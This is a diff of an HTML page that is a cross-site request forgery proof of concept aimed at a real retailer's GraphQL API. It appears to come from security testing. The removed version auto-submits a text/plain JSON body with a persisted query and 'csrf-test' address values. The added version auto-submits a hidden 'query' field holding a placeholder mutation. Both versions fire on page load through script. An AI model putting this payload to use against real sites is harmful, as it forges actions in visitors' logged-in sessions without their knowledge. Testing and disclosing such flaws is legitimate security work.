@@ -1,19 +1,19 @@
 
+
+
 <!DOCTYPE html>
 <html>
 <body>
-
-<form action="https://www.zalando.co.uk/api/graphql/" method="POST"
-      enctype="text/plain">
-
-<textarea name='x'>[{"id":"e16875cb2a4c8c86ddb78985996a42a29557c3f2f68dcbe7a3a6de5b0f0d7ba5","variables":{"normaliseAddress":{"additional":"csrf-test","city":"London","countryCode":"GB","street":"csrf-test","zip":"SW1A 1AA"}}}]</textarea>
-
+<form action="https://www.zalando.co.uk/api/graphql/" method="POST">
+    <input type="hidden" name="query" value="mutation { ... }">
+    <input type="submit" value="Submit">
 </form>
 
 <script>
 document.forms[0].submit();
 </script>
-
 </body>
 </html>
+
+
 
